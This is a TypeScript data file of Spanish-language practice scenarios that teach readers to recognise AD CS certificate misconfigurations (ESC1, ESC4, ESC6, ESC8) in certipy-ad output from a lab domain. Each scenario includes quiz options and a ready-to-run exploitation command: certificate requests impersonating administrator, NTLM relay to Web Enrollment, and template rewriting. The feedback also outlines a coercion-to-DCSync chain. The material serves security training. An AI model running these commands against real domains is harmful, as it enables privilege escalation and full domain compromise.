import type { PracticeScenario } from "./types";

export const scenarios: PracticeScenario[] = [
  {
    id: "s1",
    title: "Escenario 1 · Usuario de dominio recién comprometido",
    scenario:
      "Acabas de obtener credenciales de 'lowpriv' en lab.local. Antes de tocar nada, quieres saber si la PKI está mal configurada.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Trying to get CA configuration for 'LAB-CA' via CSRA
[*] Got CA configuration for 'LAB-CA'
[!] Vulnerabilities
    ESC1 : 'LAB.LOCAL\\\\Domain Users' can enroll, template allows SAN,
           and Client Authentication EKU is present.
           Enrollee Supplies Subject: True
           Client Authentication      : True
           Enabled                    : True
Certificate Template Name        : UserAuthSAN
Enrollment Rights                : LAB.LOCAL\\\\Domain Users`,
    question: "¿Qué ESC identificas y por qué?",
    hint: "Fíjate en 'Enrollee Supplies Subject' + 'Client Authentication' + quién puede enrolar.",
    options: [
      {
        esc: "ESC1",
        label: "ESC1 — plantilla permite SAN arbitrario",
        correct: true,
        feedback:
          "Correcto. La firma clásica de ESC1: cualquier usuario puede enrolar, la plantilla permite suplir el subject (SAN) y el EKU permite autenticación de cliente. Puedes pedir un cert 'como' cualquier usuario, incluido el DA.",
      },
      {
        esc: "ESC4",
        label: "ESC4 — permisos peligrosos sobre la plantilla",
        correct: false,
        feedback:
          "No. ESC4 aparecería como 'has dangerous permissions' (WriteDacl / WriteOwner / FullControl) sobre el objeto de la plantilla, no como 'Enrollee Supplies Subject'.",
      },
      {
        esc: "ESC8",
        label: "ESC8 — Web Enrollment con NTLM",
        correct: false,
        feedback:
          "No. ESC8 se detecta por el módulo 'relay' o por 'Web Enrollment: True' + endpoint HTTP; aquí no hay ninguna referencia a HTTP ni a NTLM relay.",
      },
    ],
    keyLines: ["ESC1", "Enrollee Supplies Subject: True", "Client Authentication      : True"],
    explanation: [
      "ESC1 = 'yo elijo quién soy'. La plantilla habilita ENROLLEE_SUPPLIES_SUBJECT y define un EKU de autenticación (Client Authentication, Smart Card Logon, Any Purpose).",
      "El siguiente paso lógico es pedir el certificado con `-upn 'administrator@lab.local'` y usarlo para autenticarse.",
    ],
    nextStep:
      "certipy-ad req -u lowpriv@lab.local -p 'Password1!' -ca LAB-CA -template UserAuthSAN -upn administrator@lab.local",
  },
  {
    id: "s2",
    title: "Escenario 2 · La CA que confía en cualquiera",
    scenario:
      "En la misma auditoría, la salida menciona una configuración global de la CA. Ninguna plantilla concreta es la culpable.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[*] Got CA configuration for 'LAB-CA'
[!] Vulnerabilities
    ESC6 : Enrollee Supplies Subject flag is enabled on the CA
           (EDITF_ATTRIBUTESUBJECTALTNAME2)
           This flag allows requesters to specify SAN in any request,
           regardless of the template configuration.
Certificate Authority Name        : LAB-CA
User Specified SAN                : Enabled
Request Disposition               : Issue`,
    question: "¿Qué implica este hallazgo?",
    hint: "El flag EDITF_ATTRIBUTESUBJECTALTNAME2 es a nivel CA, no de plantilla.",
    options: [
      {
        esc: "ESC1",
        label: "ESC1 en una plantilla específica",
        correct: false,
        feedback:
          "No. ESC1 depende de UNA plantilla con el flag. Aquí el flag está a nivel CA: afecta a CUALQUIER plantilla con auth EKU.",
      },
      {
        esc: "ESC6",
        label: "ESC6 — flag EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA",
        correct: true,
        feedback:
          "Correcto. ESC6 es el ESC1 elevado a nivel CA: no importa la plantilla, mientras haya una con EKU de auth, puedes forzar el SAN. Con EDITF activo puedes embeber el SID del objetivo en el SAN y el ataque funciona solo, incluso con Full Enforcement.",
      },
      {
        esc: "ESC7",
        label: "ESC7 — permisos ManageCA/ManageCertificates",
        correct: false,
        feedback:
          "No. ESC7 se reporta con 'has dangerous permissions on CA' (ManageCA / ManageCertificates), no con EDITF_ATTRIBUTESUBJECTALTNAME2.",
      },
    ],
    keyLines: ["ESC6", "EDITF_ATTRIBUTESUBJECTALTNAME2", "User Specified SAN                : Enabled"],
    explanation: [
      "ESC6 es peligroso porque hereda a todo el bosque: cualquier plantilla con Client Authentication EKU se vuelve explotable como si fuera ESC1.",
      "La mitigación real es quitar EDITF_ATTRIBUTESUBJECTALTNAME2. ESC6 no 'necesita' ESC9/10/16: el flag de CA permite inyectar el SID objetivo en el SAN y bypass del mapping fuerte.",
    ],
    nextStep:
      "certipy-ad req -u lowpriv@lab.local -p 'Password1!' -ca LAB-CA -template User -upn administrator@lab.local -sid 'S-1-5-21-...-500'",
  },
  {
    id: "s3",
    title: "Escenario 3 · La CA responde por HTTP",
    scenario:
      "Nmap descubre el rol de Web Enrollment en la CA. Quieres confirmar si es explotable con relay.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable -enabled",
    output: `[*] Enumerating certificate authorities
[*] Found 1 certificate authority
[!] Vulnerabilities
    ESC8 : Web Enrollment is enabled and NTLM authentication is allowed
           Endpoint: http://ca01.lab.local/certsrv/
           HTTPS Available    : False
           Channel Binding    : Not Required
           Extended Protection: Not Required`,
    question: "¿Cuál es la vía correcta para explotarlo?",
    hint: "ESC8 no se explota con certipy req directamente: necesitas forzar autenticación de una máquina.",
    options: [
      {
        esc: "ESC8-req",
        label: "certipy-ad req contra la plantilla vulnerable",
        correct: false,
        feedback:
          "No. ESC8 no depende de una plantilla mala: depende de que Web Enrollment acepte NTLM. Necesitas relayear la autenticación NTLM de una máquina (DC$).",
      },
      {
        esc: "ESC8-relay",
        label: "ntlmrelayx --target http://ca01/certsrv/ + PetitPotam/Coerce",
        correct: true,
        feedback:
          "Correcto. Flujo: coerces al DC ($) con PetitPotam/DFSCoerce → ntlmrelayx captura el NTLM → lo relayea a /certsrv/certfnsh.asp → obtienes un cert para DC$ → Pass-The-Cert → DCSync.",
      },
      {
        esc: "ESC8-add-user",
        label: "certipy account create -user attacker",
        correct: false,
        feedback:
          "No. Crear una cuenta requiere permisos AD; no tiene nada que ver con ESC8.",
      },
    ],
    keyLines: [
      "ESC8",
      "Web Enrollment is enabled and NTLM authentication is allowed",
      "HTTPS Available    : False",
      "Channel Binding    : Not Required",
    ],
    explanation: [
      "ESC8 vive en 3 condiciones: Web Enrollment activo, NTLM aceptado y sin Channel Binding / EPA.",
      "Si aparece HTTPS con Channel Binding requerido, el vector real es ESC11 (RPC + IF_ENFORCEENCRYPTICERTREQUEST desactivado).",
    ],
    nextStep:
      "ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template DomainController",
  },
  {
    id: "s4",
    title: "Escenario 4 · La plantilla que se puede reescribir",
    scenario:
      "El usuario 'lowpriv' pertenece a un grupo que gestiona plantillas. La salida menciona permisos peligrosos.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[!] Vulnerabilities
    ESC4 : 'LAB.LOCAL\\\\HelpDesk' has dangerous permissions
Certificate Template Name        : SmartcardLogon
Enrollment Rights                : LAB.LOCAL\\\\Domain Computers
Object Control Permissions
  Owner                            : LAB.LOCAL\\\\HelpDesk
  Write Owner Principals           : LAB.LOCAL\\\\HelpDesk
  Write Dacl Principals            : LAB.LOCAL\\\\HelpDesk
  Write Property Principals        : LAB.LOCAL\\\\HelpDesk`,
    question: "¿Cuál es el ataque práctico?",
    hint: "Si puedes modificar la plantilla, puedes transformarla en un ESC1.",
    options: [
      {
        esc: "ESC4-req-direct",
        label: "certipy req directo contra SmartcardLogon",
        correct: false,
        feedback:
          "No. Como está, 'Domain Users' no puede enrolarla. Tienes que modificar la plantilla primero.",
      },
      {
        esc: "ESC4-template-edit",
        label: "certipy template --write-default-configuration → convertir en ESC1 → req → auth",
        correct: true,
        feedback:
          "Correcto. Con WriteDacl/WriteProperty sobre la plantilla, la reescribes para añadir 'Domain Users' a enrollment + ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU. Al terminar, restauras la configuración original.",
      },
      {
        esc: "ESC4-ca-config",
        label: "Modificar EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA",
        correct: false,
        feedback:
          "No. Eso sería ESC6 y requiere permisos sobre la CA, no sobre la plantilla.",
      },
    ],
    keyLines: [
      "ESC4",
      "has dangerous permissions",
      "Write Dacl Principals            : LAB.LOCAL\\\\HelpDesk",
    ],
    explanation: [
      "ESC4 = 'puedo reescribir la plantilla'. Es un pre-ESC1: primero conviertes, luego explotas como ESC1.",
      "IMPORTANTE (Certipy v5): `template -write-default-configuration` hace vulnerable la plantilla y guarda backup automático a .json. Restaura con `-write-configuration SmartcardLogon.json -no-save`.",
    ],
    nextStep:
      "certipy-ad template -u lowpriv@lab.local -p 'Password1!' -template SmartcardLogon -write-default-configuration",
  },
];
